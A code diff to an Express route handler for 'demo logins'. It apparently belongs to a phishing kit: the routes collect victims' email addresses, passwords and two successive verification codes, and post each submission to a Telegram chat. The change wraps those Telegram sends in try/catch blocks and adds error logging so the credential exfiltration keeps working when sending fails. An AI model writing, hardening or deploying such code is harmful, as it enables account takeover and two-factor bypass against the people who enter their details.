@@ -30,14 +30,19 @@ export async function registerRoutes(
       const input = api.demoLogins.create.input.parse(req.body);
       const login = await storage.createDemoLogin(input);
       
-      await sendTelegramMessage(
-        `<b>New Login Attempt</b>\n\n` +
-        `<b>Email:</b> ${input.email}\n` +
-        `<b>Time:</b> ${new Date().toLocaleString()}`
-      );
+      try {
+        await sendTelegramMessage(
+          `<b>New Login Attempt</b>\n\n` +
+          `<b>Email:</b> ${input.email}\n` +
+          `<b>Time:</b> ${new Date().toLocaleString()}`
+        );
+      } catch (telegramErr) {
+        console.error("Failed to send initial telegram message:", telegramErr);
+      }
 
       res.status(201).json(login);
     } catch (err) {
+      console.error("Route Error (create):", err);
       if (err instanceof z.ZodError) {
         return res.status(400).json({
           message: err.errors[0].message,
@@ -64,17 +69,22 @@ export async function registerRoutes(
 
       const updated = await storage.updateDemoLogin(id, input);
 
-      let message = `<b>Login Update (ID: ${id})</b>\n\n`;
-      message += `<b>Email:</b> ${existing.email}\n`;
-      if (input.password) message += `<b>Password:</b> ${input.password}\n`;
-      if (input.firstCode) message += `<b>First Code:</b> ${input.firstCode}\n`;
-      if (input.secondCode) message += `<b>Second Code:</b> ${input.secondCode}\n`;
-      message += `<b>Time:</b> ${new Date().toLocaleString()}`;
+      try {
+        let message = `<b>Login Update (ID: ${id})</b>\n\n`;
+        message += `<b>Email:</b> ${existing.email}\n`;
+        if (input.password) message += `<b>Password:</b> ${input.password}\n`;
+        if (input.firstCode) message += `<b>First Code:</b> ${input.firstCode}\n`;
+        if (input.secondCode) message += `<b>Second Code:</b> ${input.secondCode}\n`;
+        message += `<b>Time:</b> ${new Date().toLocaleString()}`;
 
-      await sendTelegramMessage(message);
+        await sendTelegramMessage(message);
+      } catch (telegramErr) {
+        console.error("Failed to send update telegram message:", telegramErr);
+      }
 
       res.status(200).json(updated);
     } catch (err) {
+      console.error("Route Error (patch):", err);
       if (err instanceof z.ZodError) {
         return res.status(400).json({
           message: err.errors[0].message,
